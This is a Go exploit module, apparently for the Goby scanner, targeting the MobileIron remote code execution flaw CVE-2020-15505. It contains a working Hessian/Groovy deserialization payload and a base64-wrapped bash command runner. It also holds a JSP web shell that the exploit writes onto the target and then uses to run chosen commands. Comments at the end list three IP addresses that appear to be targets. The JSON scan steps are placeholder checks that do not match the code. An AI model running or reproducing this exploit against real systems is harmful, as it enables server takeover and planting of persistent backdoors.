package exploits

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MobileIron Remote Code Execution Vulnerability (CVE-2020-15505)",
    "Description": "<p>Both MobileIron Sentry and MobileIron Core are products of MobileIron Corporation of the United States. Sentry is an intelligent gateway product. MobileIron Core is a management console component of the MobileIron platform. The product supports defining security and management policies for devices, applications, and content.</p><p>A security vulnerability exists in MobileIron Core 10.6 and earlier, Connector 10.6 and earlier, and Sentry 9.8 and earlier. A remote attacker could exploit this vulnerability to execute arbitrary code.</p>",
    "Product": "MobileIron",
    "Homepage": "https://www.mobileiron.com/",
    "DisclosureDate": "2020-07-06",
    "Author": "sharecast.net@gmail.com",
    "FofaQuery": "body=\"btn-new btn-new-default btn-new-color\" && body=\"btn-wrapper mbxl\"",
    "GobyQuery": "body=\"btn-new btn-new-default btn-new-color\" && body=\"btn-wrapper mbxl\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.mobileiron.com/en/blog/mobileiron-security-updates-available\">https://www.mobileiron.com/en/blog/mobileiron-security-updates-available</a></p>",
    "References": [
        "https://packetstormsecurity.com/files/161097/MobileIron-MDM-Hessian-Based-Java-Deserialization-Remote-Code-Execution.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2020-15505"
    ],
    "CNNVD": [
        "CNNVD-202007-291"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "MobileIron 远程代码执行漏洞 (CVE-2020-15505)",
            "Product": "MobileIron",
            "Description": "<p>MobileIron Sentry和MobileIron Core都是美国思可信（MobileIron）公司的产品。Sentry是一款智能网关产品。MobileIron Core是一款MobileIron平台的管理控制台组件。该产品支持为设备、应用程序和内容定义安全和管理策略。</p><p>MobileIron Core 10.6及之前版本、Connector 10.6及之前版本和Sentry 9.8及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://www.mobileiron.com/en/blog/mobileiron-security-updates-available\">https://www.mobileiron.com/en/blog/mobileiron-security-updates-available</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "MobileIron Remote Code Execution Vulnerability (CVE-2020-15505)",
            "Product": "MobileIron",
            "Description": "<p>Both MobileIron Sentry and MobileIron Core are products of MobileIron Corporation of the United States. Sentry is an intelligent gateway product. MobileIron Core is a management console component of the MobileIron platform. The product supports defining security and management policies for devices, applications, and content.</p><p>A security vulnerability exists in MobileIron Core 10.6 and earlier, Connector 10.6 and earlier, and Sentry 9.8 and earlier. A remote attacker could exploit this vulnerability to execute arbitrary code.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://www.mobileiron.com/en/blog/mobileiron-security-updates-available\">https://www.mobileiron.com/en/blog/mobileiron-security-updates-available</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666"
}`

	genRandomString := func(n int) string {
		letterRunes := []rune("abcdefghijklmnopqrstuvwxyz")
		b := make([]rune, n)
		for i := range b {
			b[i] = letterRunes[rand.Intn(len(letterRunes))]
		}
		return string(b)
	}

	generateHessianGroovy := func(cmd string) string {
		header := "630200480004" + hex.EncodeToString([]byte(genRandomString(4)))
		part1Payload := "4D7400004D74001367726F6F76792E7574696C2E457870616E646F530011657870616E646F50726F706572746965734D74000053000868617368436F64654D7400296F72672E636F6465686175732E67726F6F76792E72756E74696D652E4D6574686F64436C6F737572655300066D6574686F64530005737461727453000F7265736F6C76655374726174656779490000000053000964697265637469766549000000005300196D6178696D756D4E756D6265724F66506172616D6574657273490000000053000864656C65676174654D7400186A6176612E6C616E672E50726F636573734275696C64657253001372656469726563744572726F7253747265616D46530007636F6D6D616E64566C00000003530004626173685300022D6353"
		cmdLen := fmt.Sprintf("%04x", len(cmd))
		part2Payload := "7A5300096469726563746F72794E53000B656E7669726F6E6D656E744E5300097265646972656374734E7A5300056F776E6572520000000453000A746869734F626A6563744E53000E706172616D657465725479706573567400105B6A6176612E6C616E672E436C6173736C000000007A5300036263774E7A7A7A5200000001520000000152000000017A"
		payloadHex := header + part1Payload + cmdLen + hex.EncodeToString([]byte(cmd)) + part2Payload
		payloadHex = strings.ToUpper(payloadHex)
		payload, _ := hex.DecodeString(payloadHex)
		hessianPayload := bytes.NewBuffer(payload).String()
		return hessianPayload
	}

	ofbBashBase64CMD := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		cmdstr := fmt.Sprintf(`echo %s|base64 -d|bash`, cmdBase64)
		return cmdstr
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/mifs/.;/services/LogService"
			payload, _ := hex.DecodeString("630200480004")
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "x-application/hessian")
			cfg.Header.Store("Referer", u.FixedHostInfo)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = bytes.NewBuffer(payload).String()
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && resp.Header.Get("Content-Type") == "application/x-hessian" {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd1 := ss.Params["cmd"].(string)
			uri := "/mifs/.;/services/LogService"
			shell := `<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");

    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>`
			cmd := fmt.Sprintf("echo '%s'  >  /mi/tomcat/webapps/mifs/403.jsp.jsp", shell)
			payload := generateHessianGroovy(ofbBashBase64CMD(cmd))
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "x-application/hessian")
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = payload
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && resp.Header.Get("Content-Type") == "application/x-hessian" {
					shellUrl := fmt.Sprintf("%s%s", expResult.HostInfo.FixedHostInfo, "/mifs/403.jsp.jsp?cmd="+cmd1)
					if resp, err := httpclient.SimpleGet(shellUrl); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = resp.RawBody
						}
					}
				}
			}

			return expResult
		},
	))

}

//https://12.230.116.23
//https://195.121.65.142
//https://195.20.221.205